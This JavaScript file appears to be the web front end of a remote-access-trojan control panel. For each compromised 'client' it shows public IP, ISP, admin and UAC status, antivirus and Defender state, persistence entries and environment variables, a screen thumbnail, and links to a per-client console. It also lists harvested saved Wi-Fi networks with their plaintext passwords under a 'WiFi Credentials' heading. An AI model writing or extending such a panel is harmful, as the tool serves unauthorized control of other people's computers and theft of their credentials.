// ── Client Panel Page ─────────────────────────────────────────────────────────
// Shows detailed system information for a single client.

const clientId = window.location.pathname.split("/")[1];
if (!clientId) {
  window.location.href = "/";
}

// ── Utility helpers ──────────────────────────────────────────────────────────
function escapeHtml(text) {
  const div = document.createElement("div");
  div.textContent = text;
  return div.innerHTML;
}

function countryToFlag(code) {
  if (!code || code === "ZZ") return '<span class="fi fi-xx"></span>';
  return `<span class="fi fi-${code.toLowerCase()}"></span>`;
}

function formatAgo(ts) {
  if (!ts) return "never";
  const diff = Date.now() - ts;
  const secs = Math.floor(diff / 1000);
  if (secs < 60) return `${secs}s ago`;
  const mins = Math.floor(secs / 60);
  if (mins < 60) return `${mins}m ago`;
  const hrs = Math.floor(mins / 60);
  if (hrs < 24) return `${hrs}h ago`;
  const days = Math.floor(hrs / 24);
  return `${days}d ago`;
}

function formatPing(ms) {
  if (ms == null || ms < 0) return "-- ms";
  return `${Math.round(ms)} ms`;
}

function shortId(id) {
  if (!id) return "????????";
  return id.length > 8 ? id.substring(0, 8) : id;
}

function infoSection(title, icon, items) {
  return `
    <div class="info-section">
      <div class="info-section-title">
        <i class="${icon}"></i>
        <span>${escapeHtml(title)}</span>
      </div>
      <div class="info-section-body">
        ${items.map(item => `
          <div class="info-row">
            <span class="info-row-label">${escapeHtml(item.label)}</span>
            <span class="info-row-value">${item.value}</span>
          </div>
        `).join("")}
      </div>
    </div>
  `;
}

// ── Load client data ─────────────────────────────────────────────────────────
async function loadClientInfo() {
  try {
    const res = await fetch(`/api/clients/${clientId}/info`, { credentials: "include" });
    if (!res.ok) {
      document.getElementById("panel-title").textContent = "Client Not Found";
      document.getElementById("panel-subtitle").textContent = `Could not find client ${clientId}`;
      return;
    }
    const data = await res.json();
    renderPanel(data);
  } catch (err) {
    console.error("Failed to load client info:", err);
    document.getElementById("panel-title").textContent = "Error";
    document.getElementById("panel-subtitle").textContent = "Failed to load client information";
  }
}

function renderPanel(client) {
  // Title & subtitle
  const nickname = client.nickname || client.host || shortId(client.id);
  document.getElementById("panel-title").textContent = nickname;
  document.getElementById("panel-subtitle").textContent = `${client.id} • ${client.user || "unknown"}@${client.host || "unknown"}`;

  // Country flag
  document.getElementById("panel-country-flag").innerHTML = countryToFlag(client.country);

  // Status pill
  const statusPill = document.getElementById("panel-status-pill");
  if (client.online) {
    statusPill.className = "pill pill-online";
    statusPill.innerHTML = '<i class="fa-solid fa-circle"></i> Online';
  } else {
    statusPill.className = "pill pill-offline";
    statusPill.innerHTML = '<i class="fa-solid fa-circle"></i> Offline';
  }

  // Ping pill
  document.getElementById("panel-ping-pill").innerHTML =
    `<i class="fa-solid fa-satellite-dish"></i> ${formatPing(client.pingMs)}`;

  // Quick info sidebar
  renderQuickInfo(client);

  // Preview thumbnail
  renderPreview(client);

  // Main info grid
  renderInfoGrid(client);

  // Start resource polling if online
  if (client.online) {
    startResourcePolling();
  } else {
    stopResourcePolling();
    resetGauges();
  }
}

function renderQuickInfo(client) {
  const container = document.getElementById("panel-quick-info");
  const os = client.os || "unknown";
  const osIcon = os.includes("windows") ? "fa-brands fa-windows" :
                 os.includes("linux") ? "fa-brands fa-linux" :
                 os.includes("darwin") ? "fa-brands fa-apple" : "fa-solid fa-desktop";

  container.innerHTML = `
    <div class="quick-info-item">
      <span class="quick-info-label">OS</span>
      <span class="quick-info-value"><i class="${osIcon}"></i> ${escapeHtml(os)}</span>
    </div>
    <div class="quick-info-item">
      <span class="quick-info-label">Arch</span>
      <span class="quick-info-value">${escapeHtml(client.arch || "unknown")}</span>
    </div>
    <div class="quick-info-item">
      <span class="quick-info-label">Version</span>
      <span class="quick-info-value">${escapeHtml(client.version || "unknown")}</span>
    </div>
    <div class="quick-info-item">
      <span class="quick-info-label">User</span>
      <span class="quick-info-value">${escapeHtml(client.user || "unknown")}</span>
    </div>
    <div class="quick-info-item">
      <span class="quick-info-label">Last Seen</span>
      <span class="quick-info-value">${formatAgo(client.lastSeen)}</span>
    </div>
    ${client.groupName ? `
    <div class="quick-info-item">
      <span class="quick-info-label">Group</span>
      <span class="quick-info-value" style="color:${escapeHtml(client.groupColor || '#94a3b8')}">${escapeHtml(client.groupName)}</span>
    </div>` : ""}
  `;
}

function renderPreview(client) {
  const preview = document.getElementById("panel-preview");
  if (client.thumbnail) {
    preview.innerHTML = `<img src="${escapeHtml(client.thumbnail)}" alt="preview" class="panel-preview-img" />`;
  } else {
    preview.innerHTML = `
      <div class="panel-preview-placeholder">
        <i class="fa-solid fa-desktop"></i>
      </div>
    `;
  }
}

function renderInfoGrid(client) {
  const grid = document.getElementById("panel-info-grid");
  const items = [];

  // ── Network ──────────────────────────────────────────────────────────────
  items.push(infoSection("Network", "fa-solid fa-network-wired", [
    { label: "Public IP", value: client.publicIp ? `<code>${escapeHtml(client.publicIp)}</code>` : '<span class="text-slate-500">Unknown</span>' },
    { label: "Local IP", value: client.ip ? `<code>${escapeHtml(client.ip)}</code>` : '<span class="text-slate-500">Unknown</span>' },
    { label: "Country", value: `${countryToFlag(client.country)} ${escapeHtml(client.country || "ZZ")}` },
    { label: "ASN", value: client.asn ? `<code>${escapeHtml(client.asn)}</code>` : '<span class="text-slate-500">Unknown</span>' },
    { label: "ISP", value: client.isp ? escapeHtml(client.isp) : '<span class="text-slate-500">Unknown</span>' },
  ]));

  // ── System ───────────────────────────────────────────────────────────────
  items.push(infoSection("System", "fa-solid fa-computer", [
    { label: "Hostname", value: `<code>${escapeHtml(client.host || "unknown")}</code>` },
    { label: "Username", value: `<code>${escapeHtml(client.user || "unknown")}</code>` },
    { label: "CPU", value: client.cpu ? escapeHtml(client.cpu) : '<span class="text-slate-500">Unknown</span>' },
    { label: "GPU", value: client.gpu ? escapeHtml(client.gpu) : '<span class="text-slate-500">Unknown</span>' },
    { label: "RAM", value: client.ram ? escapeHtml(client.ram) : '<span class="text-slate-500">Unknown</span>' },
    { label: "HWID", value: `<code class="text-xs">${escapeHtml(shortId(client.hwid || "unknown"))}</code>` },
    { label: "Admin", value: client.isAdmin ? '<span class="pill pill-admin"><i class="fa-solid fa-shield-halved"></i> Yes</span>' : '<span class="text-slate-500">No</span>' },
    { label: "Elevation", value: client.elevation ? `<span class="pill pill-ghost">${escapeHtml(client.elevation)}</span>` : '<span class="text-slate-500">Unknown</span>' },
  ]));

  // ── Security ─────────────────────────────────────────────────────────────
  const securityItems = [];
  if (client.antivirus) {
    securityItems.push({ label: "Antivirus", value: escapeHtml(client.antivirus) });
  }
  if (client.firewall !== undefined) {
    securityItems.push({ label: "Firewall", value: client.firewall ? '<span class="text-emerald-400"><i class="fa-solid fa-shield-halved"></i> Enabled</span>' : '<span class="text-red-400"><i class="fa-solid fa-shield-halved"></i> Disabled</span>' });
  }
  if (client.defender !== undefined) {
    securityItems.push({ label: "Windows Defender", value: client.defender ? '<span class="text-emerald-400"><i class="fa-solid fa-shield-halved"></i> Enabled</span>' : '<span class="text-red-400"><i class="fa-solid fa-shield-halved"></i> Disabled</span>' });
  }
  if (client.uac !== undefined) {
    securityItems.push({ label: "UAC", value: client.uac ? '<span class="text-emerald-400">Enabled</span>' : '<span class="text-red-400">Disabled</span>' });
  }
  if (client.defaultBrowser) {
    securityItems.push({ label: "Default Browser", value: escapeHtml(client.defaultBrowser) });
  }
  if (securityItems.length > 0) {
    items.push(infoSection("Security", "fa-solid fa-shield-halved", securityItems));
  }

  // ── Saved Wi-Fi ──────────────────────────────────────────────────────────
  if (client.wifiProfiles && client.wifiProfiles.length > 0) {
    items.push(infoSection("Saved Wi-Fi Networks", "fa-solid fa-wifi",
      client.wifiProfiles.map(w => ({
        label: escapeHtml(w.ssid),
        value: `<code class="text-xs">${escapeHtml(w.password || "N/A")}</code>`
      }))
    ));
  }

  // ── Local Users ──────────────────────────────────────────────────────────
  if (client.localUsers && client.localUsers.length > 0) {
    items.push(infoSection("Local Users", "fa-solid fa-users",
      client.localUsers.map(u => ({
        label: escapeHtml(u.name),
        value: `<span class="text-xs">${escapeHtml(u.admin ? "Admin" : "Standard")}${u.loggedIn ? ' • <span class="text-emerald-400">Logged In</span>' : ''}</span>`
      }))
    ));
  }

  // ── Startup Items ────────────────────────────────────────────────────────
  if (client.startupItems && client.startupItems.length > 0) {
    items.push(infoSection("Startup Items", "fa-solid fa-power-off",
      client.startupItems.map(s => ({
        label: escapeHtml(s.name),
        value: `<span class="text-xs">${escapeHtml(s.type)} • ${escapeHtml(s.path || "")}</span>`
      }))
    ));
  }

  grid.innerHTML = items.join("");
}

// ── Resource usage polling (every 7s via HTTP) ──────────────────────────────
let resourceInterval = null;
let resourceFetching = false;

function startResourcePolling() {
  if (resourceInterval) return;
  fetchResourceUsage(); // immediate first call
  resourceInterval = setInterval(fetchResourceUsage, 7000);
}

function stopResourcePolling() {
  if (resourceInterval) {
    clearInterval(resourceInterval);
    resourceInterval = null;
  }
}

function resetGauges() {
  ["cpu", "ram", "disk"].forEach(key => {
    const valEl = document.getElementById(`gauge-${key}`);
    const barEl = document.getElementById(`gauge-${key}-bar`);
    if (valEl) valEl.textContent = "--%";
    if (barEl) {
      barEl.style.width = "0%";
      barEl.className = "gauge-bar-fill";
    }
  });
  const ramDetail = document.getElementById("gauge-ram-detail");
  const diskDetail = document.getElementById("gauge-disk-detail");
  if (ramDetail) ramDetail.textContent = "";
  if (diskDetail) diskDetail.textContent = "";
}

async function fetchResourceUsage() {
  if (resourceFetching) return;
  resourceFetching = true;
  try {
    // Save scroll positions using a more robust approach - map by section title text
    const scrollPositions = new Map();
    const regionContainers = document.querySelectorAll('.extended-region-grid');
    regionContainers.forEach(grid => {
      grid.querySelectorAll('.info-section-body').forEach(body => {
        const section = body.closest('.info-section');
        if (section) {
          const title = section.querySelector('.info-section-title span');
          if (title) {
            scrollPositions.set(title.textContent, body.scrollTop);
          }
        }
      });
    });

    const res = await fetch(`/api/clients/${clientId}/resource-usage`, {
      method: "GET",
      credentials: "include",
    });
    if (!res.ok) return;
    const data = await res.json();
    if (data && !data.error) {
      updateGauges(data);
      // Restore scroll positions after DOM update
      setTimeout(() => {
        scrollPositions.forEach((scrollTop, titleText) => {
          // Find the section by title text
          const allSections = document.querySelectorAll('.extended-region-grid .info-section');
          allSections.forEach(section => {
            const title = section.querySelector('.info-section-title span');
            if (title && title.textContent === titleText) {
              const body = section.querySelector('.info-section-body');
              if (body) {
                body.scrollTop = scrollTop;
              }
            }
          });
        });
      }, 100);
    }
  } catch (err) {
    console.error("Failed to fetch resource usage:", err);
  } finally {
    resourceFetching = false;
  }
}

function updateGauges(data) {
  const cpu = data.cpu_usage ?? 0;
  const ram = data.ram_usage ?? 0;
  const disk = data.disk_usage ?? 0;

  // CPU
  document.getElementById("gauge-cpu").textContent = `${Math.round(cpu)}%`;
  document.getElementById("gauge-cpu-bar").style.width = `${cpu}%`;
  document.getElementById("gauge-cpu-bar").className = `gauge-bar-fill ${getGaugeColorClass(cpu)}`;

  // RAM
  document.getElementById("gauge-ram").textContent = `${Math.round(ram)}%`;
  document.getElementById("gauge-ram-bar").style.width = `${ram}%`;
  document.getElementById("gauge-ram-bar").className = `gauge-bar-fill ${getGaugeColorClass(ram)}`;
  if (data.ram_used && data.ram_total) {
    document.getElementById("gauge-ram-detail").textContent = `${data.ram_used} / ${data.ram_total}`;
  }

  // Disk
  document.getElementById("gauge-disk").textContent = `${Math.round(disk)}%`;
  document.getElementById("gauge-disk-bar").style.width = `${disk}%`;
  document.getElementById("gauge-disk-bar").className = `gauge-bar-fill ${getGaugeColorClass(disk)}`;
  if (data.disk_used && data.disk_total) {
    document.getElementById("gauge-disk-detail").textContent = `${data.disk_used} / ${data.disk_total}`;
  }

  // Extended info sections
  renderExtendedInfo(data);
}

function renderExtendedInfo(data) {
  const container = document.getElementById("panel-extended-info");
  if (!container) return;

  // ── Persistence Region ─────────────────────────────────────────────────
  const persistenceSections = [];

  if (data.scheduled_tasks && data.scheduled_tasks.length > 0) {
    persistenceSections.push(infoSection(
      `Scheduled Tasks (${data.scheduled_tasks.length})`,
      "fa-solid fa-clock",
      data.scheduled_tasks.slice(0, 20).map(t => ({
        label: escapeHtml(t.name || ""),
        value: `<span class="text-xs">${escapeHtml(t.state || "")} • ${escapeHtml(t.next_run || "—")} • ${escapeHtml(t.command || "")}</span>`
      }))
    ));
  }

  if (data.registry_persistence && data.registry_persistence.length > 0) {
    persistenceSections.push(infoSection(
      `Registry Persistence (${data.registry_persistence.length})`,
      "fa-solid fa-database",
      data.registry_persistence.slice(0, 20).map(r => ({
        label: escapeHtml(r.key || ""),
        value: `<span class="text-xs">${escapeHtml(r.name || "")} = ${escapeHtml(r.value || "")}</span>`
      }))
    ));
  }

  if (data.startup_programs && data.startup_programs.length > 0) {
    persistenceSections.push(infoSection(
      `Startup Programs (${data.startup_programs.length})`,
      "fa-solid fa-power-off",
      data.startup_programs.slice(0, 20).map(s => ({
        label: escapeHtml(s.name || ""),
        value: `<span class="text-xs">${escapeHtml(s.location || "")} • ${escapeHtml(s.path || "")}</span>`
      }))
    ));
  }

  // ── System Region ──────────────────────────────────────────────────────
  const systemSections = [];

  if (data.running_services && data.running_services.length > 0) {
    systemSections.push(infoSection(
      `Running Services (${data.running_services.length})`,
      "fa-solid fa-gears",
      data.running_services.slice(0, 20).map(s => ({
        label: escapeHtml(s.display_name || s.name || ""),
        value: `<span class="text-xs">${escapeHtml(s.state || "")} • ${escapeHtml(s.start_mode || "")}</span>`
      }))
    ));
  }

  if (data.antivirus_products && data.antivirus_products.length > 0) {
    systemSections.push(infoSection(
      "Antivirus Products",
      "fa-solid fa-shield-virus",
      data.antivirus_products.map(a => ({
        label: escapeHtml(a),
        value: '<span class="text-emerald-400">Detected</span>'
      }))
    ));
  }

  if (data.logged_in_users && data.logged_in_users.length > 0) {
    systemSections.push(infoSection(
      "Logged In Users",
      "fa-solid fa-user-check",
      data.logged_in_users.map(u => ({
        label: escapeHtml(u),
        value: '<span class="text-emerald-400">Active</span>'
      }))
    ));
  }

  if (data.env_vars && Object.keys(data.env_vars).length > 0) {
    systemSections.push(infoSection(
      "Environment Variables",
      "fa-solid fa-terminal",
      Object.entries(data.env_vars).map(([k, v]) => ({
        label: escapeHtml(k),
        value: `<code class="text-xs">${escapeHtml(String(v))}</code>`
      }))
    ));
  }

  // ── Network Region ─────────────────────────────────────────────────────
  const networkSections = [];

  if (data.network_connections && data.network_connections.length > 0) {
    networkSections.push(infoSection(
      `Network Connections (${data.network_connections.length})`,
      "fa-solid fa-network-wired",
      data.network_connections.slice(0, 20).map(c => ({
        label: escapeHtml(c.local_addr || ""),
        value: `<span class="text-xs">${escapeHtml(c.remote_addr || "—")} • ${escapeHtml(c.state || "")} • PID ${c.pid || "?"}</span>`
      }))
    ));
  }

  // ── WiFi Credentials Region ────────────────────────────────────────────
  const wifiSections = [];

  if (data.wifi_profiles && data.wifi_profiles.length > 0) {
    wifiSections.push(infoSection(
      `Saved WiFi Networks (${data.wifi_profiles.length})`,
      "fa-solid fa-wifi",
      data.wifi_profiles.map(w => ({
        label: escapeHtml(w.ssid || ""),
        value: `<span class="text-xs">${w.password ? `<span class="text-emerald-400">${escapeHtml(w.password)}</span>` : '<span class="text-yellow-400">No password</span>'} • ${escapeHtml(w.security || "")}</span>`
      }))
    ));
  }

  // ── Linux/macOS Region ─────────────────────────────────────────────────
  const otherSections = [];

  if (data.cron_jobs && data.cron_jobs.length > 0) {
    otherSections.push(infoSection(
      `Cron Jobs (${data.cron_jobs.length})`,
      "fa-solid fa-clock",
      data.cron_jobs.slice(0, 20).map(c => ({
        label: escapeHtml(c.command || ""),
        value: `<span class="text-xs">${escapeHtml(c.user || "")} • ${escapeHtml(c.schedule || "")}</span>`
      }))
    ));
  }

  if (data.systemd_units && data.systemd_units.length > 0) {
    otherSections.push(infoSection(
      `Systemd Units (${data.systemd_units.length})`,
      "fa-solid fa-gears",
      data.systemd_units.slice(0, 20).map(u => ({
        label: escapeHtml(u.name || ""),
        value: `<span class="text-xs">${escapeHtml(u.active_state || "")} • ${escapeHtml(u.sub_state || "")}</span>`
      }))
    ));
  }

  if (data.launch_agents && data.launch_agents.length > 0) {
    otherSections.push(infoSection(
      `Launch Agents (${data.launch_agents.length})`,
      "fa-solid fa-rocket",
      data.launch_agents.slice(0, 20).map(l => ({
        label: escapeHtml(l.label || ""),
        value: `<span class="text-xs">${escapeHtml(l.program || "")} • ${l.run_at_load ? "RunAtLoad" : ""}</span>`
      }))
    ));
  }
  if (data.launch_daemons && data.launch_daemons.length > 0) {
    otherSections.push(infoSection(
      `Launch Daemons (${data.launch_daemons.length})`,
      "fa-solid fa-rocket",
      data.launch_daemons.slice(0, 20).map(l => ({
        label: escapeHtml(l.label || ""),
        value: `<span class="text-xs">${escapeHtml(l.program || "")} • ${l.run_at_load ? "RunAtLoad" : ""}</span>`
      }))
    ));
  }

  // Build the region layout
  let html = "";

  if (persistenceSections.length > 0) {
    html += `<div class="extended-region"><div class="extended-region-title"><i class="fa-solid fa-lock"></i> Persistence</div><div class="extended-region-grid">${persistenceSections.join("")}</div></div>`;
  }
  if (systemSections.length > 0) {
    html += `<div class="extended-region"><div class="extended-region-title"><i class="fa-solid fa-computer"></i> System</div><div class="extended-region-grid">${systemSections.join("")}</div></div>`;
  }
  if (networkSections.length > 0) {
    html += `<div class="extended-region"><div class="extended-region-title"><i class="fa-solid fa-network-wired"></i> Network</div><div class="extended-region-grid">${networkSections.join("")}</div></div>`;
  }
  if (wifiSections.length > 0) {
    html += `<div class="extended-region"><div class="extended-region-title"><i class="fa-solid fa-wifi"></i> WiFi Credentials</div><div class="extended-region-grid">${wifiSections.join("")}</div></div>`;
  }
  if (otherSections.length > 0) {
    html += `<div class="extended-region"><div class="extended-region-title"><i class="fa-solid fa-globe"></i> Other</div><div class="extended-region-grid">${otherSections.join("")}</div></div>`;
  }

  container.innerHTML = html;
}

function getGaugeColorClass(value) {
  if (value >= 90) return "gauge-bar-critical";
  if (value >= 70) return "gauge-bar-warning";
  if (value >= 40) return "gauge-bar-moderate";
  return "gauge-bar-ok";
}

// ── Nav actions (open viewer pages) ─────────────────────────────────────────
document.addEventListener("click", (e) => {
  const link = e.target.closest(".panel-nav-action");
  if (!link) return;
  e.preventDefault();
  const href = link.dataset.href;
  if (href) {
    // Pages that use ?clientId= query param (path-based pages use /:clientId/feature)
    if (link.dataset.query === "true") {
      window.location.href = `${href}?clientId=${clientId}`;
    } else {
      // Path-based pages like /:clientId/console
      window.location.href = `/${clientId}${href}`;
    }
  }
});

// ── Init ─────────────────────────────────────────────────────────────────────
loadClientInfo();
